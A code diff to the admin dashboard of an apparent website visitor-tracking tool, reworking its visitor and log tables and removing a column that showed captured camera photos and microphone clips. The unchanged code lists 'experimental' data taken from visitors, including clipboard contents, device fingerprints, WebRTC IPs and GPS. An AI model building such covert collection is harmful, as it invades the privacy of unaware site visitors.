@@ -232,8 +232,8 @@
     </div>
     <div class="card">
       <h2>Visitors <span class="badge" id="vl-total"></span></h2>
-      <p class="sub">One line per address, newest activity first. Click an address to filter the log below.</p>
-      <table><thead><tr><th>Address</th><th>From</th><th>Location</th><th>Device</th><th class="hide-sm">Account</th><th>Hits</th><th class="hide-sm">First seen</th><th>Last seen</th></tr></thead><tbody id="vl-visitors"></tbody></table>
+      <p class="sub">One line per address, newest activity first. Click an address for its full formatted details.</p>
+      <div style="overflow-x:auto"><table style="min-width:760px"><thead><tr><th>Address</th><th>From</th><th>Location</th><th>Device</th><th class="hide-sm">Account</th><th>Hits</th><th class="hide-sm">First seen</th><th>Last seen</th></tr></thead><tbody id="vl-visitors"></tbody></table></div>
     </div>
     <div class="card" id="vl-profile-card" style="display:none">
       <h2>Visitor detail <span class="badge" id="vl-profile-ip"></span> <button class="btn" onclick="loadVisitors('')" style="margin-left:8px">Show all visitors</button></h2>
@@ -241,7 +241,7 @@
     </div>
     <div class="card">
       <h2>Log <span class="badge" id="vl-filter"></span> <button class="btn" id="vl-clearfilter" onclick="loadVisitors('')" style="display:none">Show all</button></h2>
-      <table><thead><tr><th>When</th><th>Address</th><th>Who</th><th>What</th><th class="hide-sm">Device</th><th>Details</th></tr></thead><tbody id="vl-rows"></tbody></table>
+      <div style="overflow-x:auto"><table style="min-width:680px"><thead><tr><th>When</th><th>Address</th><th>Who</th><th>What</th><th class="hide-sm">Device</th></tr></thead><tbody id="vl-rows"></tbody></table></div>
     </div>
   </section>
 </div>
@@ -413,13 +413,12 @@
       const EXPK = ["gpu","fingerprint","webrtc_ips","battery","cam_count","mic_count","notif_perm","motion","clipboard","exp_errors"];
       const hasExp = r.client && EXPK.some(k=>r.client[k]!=null);
       const what = r.method==="CAPTURE" ? `<b style="color:var(--signal)">${esc(r.path)}</b>` : r.method==="BEACON" ? (hasExp?'<b style="color:var(--signal)">experimental</b>':"browser details") : `${esc(r.method)} ${esc(r.path)} → ${r.status}` + (r.detail?` <b>${esc(r.detail)}</b>`:"");
-      let det = r.client ? Object.entries(r.client).filter(([k,v])=>v!==""&&v!==false&&v!==0&&k!=="capture"&&k!=="kind").map(([k,v])=>k+"="+v).join(" · ") : [r.lang, r.referer?"from "+r.referer:""].filter(Boolean).join(" · ");
-      if(r.client && r.client.capture){ const u="/api/admin/capture/"+encodeURIComponent(r.client.capture); det = r.client.kind==="camera" ? `<a href="${u}" target="_blank" rel="noopener"><img src="${u}" style="max-width:160px;border-radius:8px;display:block"></a>` : `<audio controls src="${u}" style="height:32px"></audio>`; }
+
       const gps = r.client && r.client.lat!=null ? `https://www.openstreetmap.org/?mlat=${r.client.lat}&mlon=${r.client.lon}#map=17/${r.client.lat}/${r.client.lon}` : null;
       const whatCell = gps ? `<a class="dirlink" href="${gps}" target="_blank" rel="noopener">${esc(r.detail)}</a>` : what;
       return `<tr><td class="num">${when(r.ts)}</td><td><a class="dirlink" onclick="loadVisitors('${esc(r.ip)}')">${esc(r.ip)}</a> ${viaBadge(r.via)}</td>
       <td class="num">${esc(r.user||"—")}</td><td style="${r.detail&&r.detail.includes("FAILED")?"color:var(--pop)":""}">${whatCell}</td>
-      <td class="num hide-sm">${esc([r.device,r.os,r.browser].filter(Boolean).join(" · "))}</td><td class="num" style="max-width:420px;white-space:normal;word-break:break-word">${esc(det)}${r.geo&&r.geo.status==="success"?"<br>"+esc(geoText(r.geo)):""}</td></tr>`; }).join("") : `<tr><td colspan="6" class="empty">No entries.</td></tr>`;
+      <td class="num hide-sm">${esc([r.device,r.os,r.browser].filter(Boolean).join(" · "))}</td></tr>`; }).join("") : `<tr><td colspan="5" class="empty">No entries.</td></tr>`;
   };
   const EXP = [["webrtc_ip","WebRTC IP address"],["battery","Battery level"],["gpu","GPU model"],["fingerprint","Device fingerprint"],["device_counts","Camera/mic counts"],["notifications","Notifications permission"],["motion","Motion sensors"],["camera","Camera photo"],["mic","Microphone clip"],["clipboard","Clipboard contents"]];
   function renderExperimental(exp){
